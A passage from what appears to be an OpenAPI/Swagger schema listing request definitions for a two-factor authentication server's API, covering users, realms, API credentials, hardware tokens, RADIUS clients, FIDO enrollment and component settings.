      "properties": {
        "usersWithRealm": {
          "description": "List of users.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UsernameWithRealmAndCompany"
          }
        }
      },
      "type": "object",
      "format": "Request_CreateUserSelection"
    },
    "Request_DeleteApiCredentials": {
      "properties": {
        "username": {
          "description": "API credentials - user name (is unique).",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_DeleteApiCredentials"
    },
    "Request_DeleteApiCredentials_Multiaction2": {
      "properties": {
        "usernames": {
          "description": "API credentials - List of user names (are unique).",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ApiCredentials"
          }
        },
        "filter": {
          "$ref": "#/definitions/ApiConsumerSettingFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_DeleteApiCredentials_Multiaction2"
    },
    "Request_DeleteComponentApiCredentials": {
      "properties": {
        "username": {
          "description": "API credentials - user name (is unique).",
          "type": "string"
        },
        "deleteComponents": {
          "description": "Whether to delete components which use these credentials, too.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_DeleteComponentApiCredentials"
    },
    "Request_DeleteComponentApiCredentials_Multiaction2": {
      "properties": {
        "usernames": {
          "description": "API credentials - List of user names (are unique).",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ApiCredentials"
          }
        },
        "deleteComponents": {
          "description": "Whether to delete components which use these credentials, too.",
          "type": "boolean"
        },
        "filter": {
          "$ref": "#/definitions/ApiConsumerSettingFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_DeleteComponentApiCredentials_Multiaction2"
    },
    "Request_DeleteEmptyRealms": {
      "properties": {
        "categoryFilter": {
          "description": "Category key.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_DeleteEmptyRealms"
    },
    "Request_DeleteHardToken": {
      "properties": {
        "hardTokenSerialNumber": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_DeleteHardToken"
    },
    "Request_DeleteHardTokens_Multiaction2": {
      "properties": {
        "hardTokenSerialNumbers": {
          "type": "array",
          "items": {
            "$ref": "#/definitions/HardTokenSerialNumber"
          }
        },
        "filter": {
          "$ref": "#/definitions/HardTokenFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_DeleteHardTokens_Multiaction2"
    },
    "Request_DeleteIdentityProviderConfiguration": {
      "properties": {
        "id": {
          "description": "Unique Identity Provider configuration ID.",
          "type": "string"
        },
        "componentKey": {
          "description": "Component key of the Identity Provider server component.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_DeleteIdentityProviderConfiguration"
    },
    "Request_DeleteInvitation": {
      "properties": {
        "name": {
          "description": "Invitation display name.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_DeleteInvitation"
    },
    "Request_DeleteInvitations_Multiaction2": {
      "properties": {
        "names": {
          "description": "List of invitations display names.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/InvitationName"
          }
        },
        "filter": {
          "$ref": "#/definitions/InvitationFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_DeleteInvitations_Multiaction2"
    },
    "Request_DeleteRadiusClient": {
      "properties": {
        "id": {
          "description": "Unique RADIUS client ID.",
          "type": "string"
        },
        "componentKey": {
          "description": "Component key of the RADIUS server component.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_DeleteRadiusClient"
    },
    "Request_DeleteRealm": {
      "properties": {
        "realm": {
          "description": "Realm parameters.",
          "$ref": "#/definitions/UserRealm"
        }
      },
      "type": "object",
      "format": "Request_DeleteRealm"
    },
    "Request_DeleteThisComponentApiCredentials": {
      "type": "object",
      "format": "Request_DeleteThisComponentApiCredentials"
    },
    "Request_DeleteUser": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_DeleteUser"
    },
    "Request_DeleteUsers_Multiaction2": {
      "properties": {
        "usersWithRealm": {
          "description": "List of users.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UsernameWithRealmAndCompany"
          }
        },
        "filter": {
          "$ref": "#/definitions/UserFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_DeleteUsers_Multiaction2"
    },
    "Request_Deprovision": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_Deprovision"
    },
    "Request_Deprovision_Multiaction2": {
      "properties": {
        "usersWithRealm": {
          "description": "List of users.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UsernameWithRealmAndCompany"
          }
        },
        "filter": {
          "$ref": "#/definitions/UserFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_Deprovision_Multiaction2"
    },
    "Request_Discover": {
      "properties": {
        "componentType": {
          "type": "string"
        },
        "clientComponentVersion": {
          "type": "string"
        },
        "clientComponentCompatibility": {
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "Request_Discover"
    },
    "Request_ExternalRealmSyncDeleteUsers": {
      "properties": {
        "companyGuid": {
          "type": "string",
          "format": "guid",
          "x-nullable": true
        },
        "syncParamsExternal": {
          "$ref": "#/definitions/RealmSyncParamsExternalUserList"
        }
      },
      "type": "object",
      "format": "Request_ExternalRealmSyncDeleteUsers"
    },
    "Request_ExternalRealmSyncOUTree": {
      "properties": {
        "companyGuid": {
          "type": "string",
          "format": "guid",
          "x-nullable": true
        },
        "syncParamsExternal": {
          "$ref": "#/definitions/RealmSyncParamsExternalOUTree"
        }
      },
      "type": "object",
      "format": "Request_ExternalRealmSyncOUTree"
    },
    "Request_ExternalRealmSyncUpdateUsers": {
      "properties": {
        "companyGuid": {
          "type": "string",
          "format": "guid",
          "x-nullable": true
        },
        "syncParamsExternal": {
          "$ref": "#/definitions/RealmSyncParamsExternalUserUpdate"
        }
      },
      "type": "object",
      "format": "Request_ExternalRealmSyncUpdateUsers"
    },
    "Request_FindRealmId": {
      "properties": {
        "realmName": {
          "description": "Name of the realm (e.g. domain name).",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_FindRealmId"
    },
    "Request_GenerateEventReportExport": {
      "properties": {
        "filter": {
          "$ref": "#/definitions/ReportFilter"
        },
        "format": {
          "description": "Supported file formats: csv",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GenerateEventReportExport"
    },
    "Request_GetAllNotificationTypes": {
      "type": "object",
      "format": "Request_GetAllNotificationTypes"
    },
    "Request_GetAllOrigins": {
      "type": "object",
      "format": "Request_GetAllOrigins"
    },
    "Request_GetAllOriginsWithInfo": {
      "type": "object",
      "format": "Request_GetAllOriginsWithInfo"
    },
    "Request_GetApiCredentials2": {
      "properties": {
        "filter": {
          "description": "If specified, items will be filtered, sorted and divided by specified properties.",
          "$ref": "#/definitions/ApiConsumerSettingFilter"
        }
      },
      "type": "object",
      "format": "Request_GetApiCredentials2"
    },
    "Request_GetApiCredentialsByUsername": {
      "properties": {
        "username": {
          "description": "API credentials - user name (is unique).",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetApiCredentialsByUsername"
    },
    "Request_GetComponentApiCredentials2": {
      "properties": {
        "filter": {
          "description": "If specified, items will be filtered, sorted and divided by specified properties.",
          "$ref": "#/definitions/ApiConsumerSettingFilter"
        }
      },
      "type": "object",
      "format": "Request_GetComponentApiCredentials2"
    },
    "Request_GetComponentApiCredentialsByUsername": {
      "properties": {
        "username": {
          "description": "API credentials - user name (is unique).",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetComponentApiCredentialsByUsername"
    },
    "Request_GetComponentSettings2": {
      "properties": {
        "filter": {
          "description": "If specified, items will be filtered, sorted and divided by specified properties.",
          "$ref": "#/definitions/ComponentInfoWithSettingsFilter"
        }
      },
      "type": "object",
      "format": "Request_GetComponentSettings2"
    },
    "Request_GetComponentTypeSettings": {
      "properties": {
        "componentType": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetComponentTypeSettings"
    },
    "Request_GetComponentTypeStatistics": {
      "properties": {
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\". If not specified, returns statistics for all component types.",
          "type": "string"
        },
        "listsLimit": {
          "description": "Limit for the list of outdated components. If not specified, default value is 50.",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "Request_GetComponentTypeStatistics"
    },
    "Request_GetCoreInfo": {
      "type": "object",
      "format": "Request_GetCoreInfo"
    },
    "Request_GetCoreServerInfo": {
      "type": "object",
      "format": "Request_GetCoreServerInfo"
    },
    "Request_GetCoreSettings": {
      "type": "object",
      "format": "Request_GetCoreSettings"
    },
    "Request_GetCoreSettingsForAvailableCompanies": {
      "type": "object",
      "format": "Request_GetCoreSettingsForAvailableCompanies"
    },
    "Request_GetEventReport": {
      "properties": {
        "filter": {
          "$ref": "#/definitions/ReportFilter"
        },
        "firstRowIndex": {
          "type": "integer",
          "format": "int32"
        },
        "lastRowIndex": {
          "type": "integer",
          "format": "int32"
        }
      },
      "type": "object",
      "format": "Request_GetEventReport"
    },
    "Request_GetEventReportGraph": {
      "properties": {
        "filter": {
          "$ref": "#/definitions/ReportFilter"
        },
        "timeDataLimit": {
          "description": "Maximum number of records per event type in the time graph.",
          "type": "integer",
          "format": "int32"
        },
        "timeLabelLimit": {
          "description": "Maximum number of event types in time graph.",
          "type": "integer",
          "format": "int32"
        },
        "pieLabelLimit": {
          "description": "Maximum number of event types in pie graph. All the other event types are returned as 'Others'.",
          "type": "integer",
          "format": "int32"
        }
      },
      "type": "object",
      "format": "Request_GetEventReportGraph"
    },
    "Request_GetGroups": {
      "type": "object",
      "format": "Request_GetGroups"
    },
    "Request_GetHardTokens2": {
      "properties": {
        "filter": {
          "description": "If specified, items will be filtered, sorted and divided by specified properties.",
          "$ref": "#/definitions/HardTokenFilter"
        }
      },
      "type": "object",
      "format": "Request_GetHardTokens2"
    },
    "Request_GetIdentityProviderConfigurationById": {
      "properties": {
        "id": {
          "description": "Unique Identity Provider configuration ID.",
          "type": "string"
        },
        "componentKey": {
          "description": "Component key of the Identity Provider server component.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetIdentityProviderConfigurationById"
    },
    "Request_GetIdentityProviderConfigurations2": {
      "properties": {
        "filter": {
          "description": "If specified, items will be filtered, sorted and divided by specified properties.",
          "$ref": "#/definitions/IdentityProviderConfigurationFilter"
        }
      },
      "type": "object",
      "format": "Request_GetIdentityProviderConfigurations2"
    },
    "Request_GetInvitationByCode": {
      "properties": {
        "code": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetInvitationByCode"
    },
    "Request_GetInvitations2": {
      "properties": {
        "filter": {
          "description": "If specified, items will be filtered, sorted and divided by specified properties.",
          "$ref": "#/definitions/InvitationFilter"
        }
      },
      "type": "object",
      "format": "Request_GetInvitations2"
    },
    "Request_GetLicenseStateDetail3": {
      "properties": {
        "forceUpdate": {
          "description": "Recalculate and re-download data. Otherwise, it can return outdated information.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_GetLicenseStateDetail3"
    },
    "Request_GetLiveInstallerLink": {
      "properties": {
        "parameters": {
          "description": "Installation parameters",
          "$ref": "#/definitions/InstallerParameters"
        }
      },
      "type": "object",
      "format": "Request_GetLiveInstallerLink"
    },
    "Request_GetMasterRecoveryKeyAndInvalidateAfterLogin": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "componentKey": {
          "type": "string"
        },
        "componentType": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetMasterRecoveryKeyAndInvalidateAfterLogin"
    },
    "Request_GetMultiActionProgress": {
      "properties": {
        "key": {
          "description": "Multiaction key.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetMultiActionProgress"
    },
    "Request_GetProductVersionState": {
      "type": "object",
      "format": "Request_GetProductVersionState"
    },
    "Request_GetPropertiesForCustomizableFields": {
      "properties": {
        "preferred": {
          "description": "Get only the most probably usable properties for specified field type.",
          "type": "boolean"
        },
        "fieldType": {
          "description": "Specifies field type. Possible values: 0 - mobile number, 1 - email, 2 - display name",
          "type": "integer",
          "format": "enum",
          "enum": [
            0,
            1,
            2
          ]
        }
      },
      "type": "object",
      "format": "Request_GetPropertiesForCustomizableFields"
    },
    "Request_GetRadiusClientById": {
      "properties": {
        "id": {
          "description": "Unique RADIUS client ID.",
          "type": "string"
        },
        "componentKey": {
          "description": "Component key of the RADIUS server component.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetRadiusClientById"
    },
    "Request_GetRadiusClients2": {
      "properties": {
        "filter": {
          "description": "If specified, items will be filtered, sorted and divided by specified properties.",
          "$ref": "#/definitions/RadiusClientFilter"
        }
      },
      "type": "object",
      "format": "Request_GetRadiusClients2"
    },
    "Request_GetRealmCategories": {
      "type": "object",
      "format": "Request_GetRealmCategories"
    },
    "Request_GetRealms": {
      "properties": {
        "withUserCount": {
          "description": "Include count of users in the response. Can take longer.",
          "type": "boolean"
        },
        "categoryFilter": {
          "description": "If specified, returns only realms from the specified category.",
          "type": "string"
        },
        "realmFilter": {
          "description": "If specified, returns only this realm.",
          "$ref": "#/definitions/UserRealm"
        }
      },
      "type": "object",
      "format": "Request_GetRealms"
    },
    "Request_GetReportFilterOptions": {
      "type": "object",
      "format": "Request_GetReportFilterOptions"
    },
    "Request_GetSpecificComponentSettings": {
      "properties": {
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        },
        "componentKey": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetSpecificComponentSettings"
    },
    "Request_GetUserList": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "categoryFilter": {
          "description": "Realm category.",
          "type": "string"
        },
        "structurePath": {
          "description": "Structure path.",
          "type": "string"
        },
        "selectionId": {
          "description": "ID of the created user selection.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetUserList"
    },
    "Request_GetUserList2": {
      "properties": {
        "filter": {
          "description": "If specified, items will be filtered, sorted and divided by specified properties.",
          "$ref": "#/definitions/UserFilter"
        }
      },
      "type": "object",
      "format": "Request_GetUserList2"
    },
    "Request_GetUserProfile": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetUserProfile"
    },
    "Request_GetUserProfileByGuid": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "userGuid": {
          "description": "GUID of user.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_GetUserProfileByGuid"
    },
    "Request_GetUserProperties": {
      "type": "object",
      "format": "Request_GetUserProperties"
    },
    "Request_GetUserStatistics": {
      "properties": {
        "listsLimit": {
          "description": "Limit for the lists of users. If not specified, default value is 50.",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "Request_GetUserStatistics"
    },
    "Request_GetWebConsoleUrl": {
      "type": "object",
      "format": "Request_GetWebConsoleUrl"
    },
    "Request_ImportHardTokensFromPskc": {
      "properties": {
        "pskcContents": {
          "type": "string"
        },
        "pskcPassword": {
          "description": "Needs to be specified only if the file is encrypted.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_ImportHardTokensFromPskc"
    },
    "Request_InvitationValid": {
      "properties": {
        "invitation": {
          "description": "Invitation code.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_InvitationValid"
    },
    "Request_InvitationValid2": {
      "properties": {
        "invitation": {
          "description": "Invitation code.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_InvitationValid2"
    },
    "Request_MakeAssertion": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "clientResponse": {
          "description": "Authentication response from the FIDO authenticator.",
          "type": "string"
        },
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        },
        "generateSelfEnrollmentKey": {
          "description": "If the user is authenticating to do self-enrollment. In such case, selfEnrollmentKey will be returned and has to be provided to SelfEnroll.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_MakeAssertion"
    },
    "Request_MakeAssertionAndSync": {
      "properties": {
        "lastUsedOfflineOtps": {
          "description": "Information about authentications made without contacting Authentication Server.",
          "$ref": "#/definitions/LastUsedOfflineOtpHashesWithOffsets"
        },
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "clientResponse": {
          "description": "Authentication response from the FIDO authenticator.",
          "type": "string"
        },
        "offlineOtpsHashSalt": {
          "description": "Salt used to hash offline OTPs. Use some unique identifier of the user (e.g. SID).",
          "type": "string"
        },
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        },
        "generateSelfEnrollmentKey": {
          "description": "If the user is authenticating to do self-enrollment. In such case, selfEnrollmentKey will be returned and has to be provided to SelfEnroll.",
          "type": "boolean"
        },
        "offlineFido": {
          "description": "Data required to update FIDO key after using it in offline mode.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/FidoCredential"
          }
        }
      },
      "type": "object",
      "format": "Request_MakeAssertionAndSync"
    },
    "Request_MakeCredential": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "attestationResponse": {
          "description": "Registration response from the FIDO authenticator.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_MakeCredential"
    },
    "Request_MakeCredentialOptions": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "displayName": {
          "description": "Human readable name for the user account.",
          "type": "string"
        },
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\". Needs to be specified to be able to determine correct FIDO origin.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_MakeCredentialOptions"
    },
    "Request_Ping": {
      "type": "object",
      "format": "Request_Ping"
    },
    "Request_Provision": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_Provision"
    },
    "Request_Provision_Multiaction": {
      "properties": {
        "usersWithRealm": {
          "description": "List of users.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UsernameWithRealmAndCompany"
          }
        },
        "filter": {
          "$ref": "#/definitions/UserFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_Provision_Multiaction"
    },
    "Request_ProvisionWithQR": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "qrImageFormat": {
          "description": "Image format to be used (Png / Bmp) to save QR code. If not specified, default format is used.",
          "type": "string"
        },
        "qrOneBitPixel": {
          "description": "If true, one bit of color per pixel will be used (B/W).",
          "type": "boolean",
          "x-nullable": true
        },
        "qrSize": {
          "description": "QR code size in pixels.",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "Request_ProvisionWithQR"
    },
    "Request_RealmImportUsers": {
      "properties": {
        "fileContents": {
          "type": "string"
        },
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "options": {
          "description": "Import options.",
          "$ref": "#/definitions/RealmImportOptions"
        }
      },
      "type": "object",
      "format": "Request_RealmImportUsers"
    },
    "Request_RegisterComponent": {
      "properties": {
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        },
        "machineName": {
          "description": "Name of the computer where the component runs. Will be visible in the component list. Sending different name causes the component to be renamed. If the component was registered using an invitation, renames its invited computer, too.",
          "type": "string"
        },
        "componentState": {
          "$ref": "#/definitions/ComponentState"
        },
        "componentStartup": {
          "description": "If this is the first time the component registers after its startup (component startup event will be logged).",
          "type": "boolean"
        },
        "getSettingsOnlyAfterVersion": {
          "description": "If specified, settings with the same version will not be returned. Use this if settings are being cached locally.",
          "type": "integer",
          "format": "int64",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "Request_RegisterComponent"
    },
    "Request_ResendValidationEmailIfRequired": {
      "properties": {
        "companyGuid": {
          "type": "string",
          "format": "guid",
          "x-nullable": true
        }
      },
      "type": "object",
      "format": "Request_ResendValidationEmailIfRequired"
    },
    "Request_ResynchronizeHardToken": {
      "properties": {
        "hardTokenSerialNumber": {
          "type": "string"
        },
        "firstOtp": {
          "type": "string"
        },
        "secondOtp": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_ResynchronizeHardToken"
    },
    "Request_RevokeHardToken": {
      "properties": {
        "hardTokenSerialNumber": {
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_RevokeHardToken"
    },
    "Request_RevokeHardToken_Multiaction2": {
      "properties": {
        "hardTokenSerialNumbers": {
          "type": "array",
          "items": {
            "$ref": "#/definitions/HardTokenSerialNumber"
          }
        },
        "filter": {
          "$ref": "#/definitions/HardTokenFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_RevokeHardToken_Multiaction2"
    },
    "Request_RevokeHardTokenFromUser": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_RevokeHardTokenFromUser"
    },
    "Request_RevokeHardTokenFromUser_Multiaction2": {
      "properties": {
        "usersWithRealm": {
          "description": "List of users.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UsernameWithRealmAndCompany"
          }
        },
        "filter": {
          "$ref": "#/definitions/UserFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_RevokeHardTokenFromUser_Multiaction2"
    },
    "Request_SelfEnroll": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "selfEnrollmentKey": {
          "description": "If the user already has some functional authentication type, a key returned from an authentication is required.",
          "type": "string"
        },
        "userInput": {
          "description": "Data for self-enrollment entered by the user.",
          "$ref": "#/definitions/SelfEnrollment_UserInput"
        },
        "qrImageFormat": {
          "description": "Image format to be used (Png / Bmp) to save QR code. If not specified, default format is used.",
          "type": "string"
        },
        "qrOneBitPixel": {
          "description": "If true, one bit of color per pixel will be used (B/W).",
          "type": "boolean",
          "x-nullable": true
        },
        "qrSize": {
          "description": "QR code size in pixels.",
          "type": "integer",
          "format": "int32",
          "x-nullable": true
        },
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\". Needs to be specified to be able to determine correct FIDO origin.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_SelfEnroll"
    },
    "Request_SendFeedback": {
      "properties": {
        "text": {
          "description": "Feedback message. Required parameter.",
          "type": "string"
        },
        "email": {
          "description": "Sender's email address. Optional parameter.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_SendFeedback"
    },
    "Request_SetAuthenticationTypes": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "authenticationTypes": {
          "$ref": "#/definitions/AuthenticationTypes_Optional"
        }
      },
      "type": "object",
      "format": "Request_SetAuthenticationTypes"
    },
    "Request_SetAuthenticationTypes_Multiaction2": {
      "properties": {
        "usersWithRealm": {
          "description": "List of users.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UsernameWithRealmAndCompany"
          }
        },
        "authenticationTypes": {
          "$ref": "#/definitions/AuthenticationTypes_Optional"
        },
        "filter": {
          "$ref": "#/definitions/UserFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_SetAuthenticationTypes_Multiaction2"
    },
    "Request_SetComponentSettings": {
      "properties": {
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\".",
          "type": "string"
        },
        "components": {
          "description": "List of components together with their settings. Specify only the components and settings which should be changed. For identification of the component, only Key is necessary.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ComponentWithSettingsAndCompany"
          }
        }
      },
      "type": "object",
      "format": "Request_SetComponentSettings"
    },
    "Request_SetComponentSettings_Multiaction": {
      "properties": {
        "keys": {
          "description": "Unique component keys.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ComponentKey"
          }
        },
        "settings": {
          "$ref": "#/definitions/ComponentSettings"
        },
        "filter": {
          "$ref": "#/definitions/ComponentInfoWithSettingsFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_SetComponentSettings_Multiaction"
    },
    "Request_SetComponentTypeSettings": {
      "properties": {
        "componentTypes": {
          "description": "List of component types together with their settings. Specify only the component types and settings which should be changed.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/ComponentTypeWithSettings"
          }
        }
      },
      "type": "object",
      "format": "Request_SetComponentTypeSettings"
    },
    "Request_SetCoreSettings": {
      "properties": {
        "settings": {
          "$ref": "#/definitions/CoreSettings"
        }
      },
      "type": "object",
      "format": "Request_SetCoreSettings"
    },
    "Request_SetRealmSettings": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "settings": {
          "$ref": "#/definitions/RealmSettings"
        }
      },
      "type": "object",
      "format": "Request_SetRealmSettings"
    },
    "Request_SetUserProfileParams": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "profileParams": {
          "$ref": "#/definitions/ProfileParams"
        }
      },
      "type": "object",
      "format": "Request_SetUserProfileParams"
    },
    "Request_SetUserProfileParams_Multiaction2": {
      "properties": {
        "usersWithRealm": {
          "description": "List of users.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UsernameWithRealmAndCompany"
          }
        },
        "profileParams": {
          "$ref": "#/definitions/ProfileParams"
        },
        "filter": {
          "$ref": "#/definitions/UserFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_SetUserProfileParams_Multiaction2"
    },
    "Request_StartTwoFactorAuthentication": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm_WithAutoRegParams"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        },
        "ip": {
          "description": "User's IP address (if can be obtained). Used for whitelisting.",
          "type": "string"
        },
        "sendSms": {
          "description": "If SMS can be used (if false, SMS will not be sent).",
          "type": "boolean"
        },
        "sendPush": {
          "description": "If Push can be used (if false, Push will not be sent).",
          "type": "boolean"
        },
        "componentType": {
          "description": "Type of the authentication component. For custom components, use \"custom\". Needs to be specified to be able to evaluate whitelisting and to show the correct type in the Push notification.",
          "type": "string"
        },
        "confirmingEnrollment": {
          "description": "If logging in using the last self-enrolled credential is required (used to confirm self-enrollment). If not allowed, self-enrollment will be canceled.",
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_StartTwoFactorAuthentication"
    },
    "Request_StopMultiAction": {
      "properties": {
        "key": {
          "description": "Multiaction key.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_StopMultiAction"
    },
    "Request_UnlockUser": {
      "properties": {
        "realm": {
          "description": "User's realm. In AD mode, send null to authentication methods to use the default domain.",
          "$ref": "#/definitions/UserRealm"
        },
        "username": {
          "description": "For domain users, use samAccountName.",
          "type": "string"
        }
      },
      "type": "object",
      "format": "Request_UnlockUser"
    },
    "Request_UnlockUsers_Multiaction2": {
      "properties": {
        "usersWithRealm": {
          "description": "List of users.",
          "type": "array",
          "items": {
            "$ref": "#/definitions/UsernameWithRealmAndCompany"
          }
        },
        "filter": {
          "$ref": "#/definitions/UserFilter"
        },
        "isAllSelected": {
          "type": "boolean"
        }
      },
      "type": "object",
      "format": "Request_UnlockUsers_Multiaction2"
    },
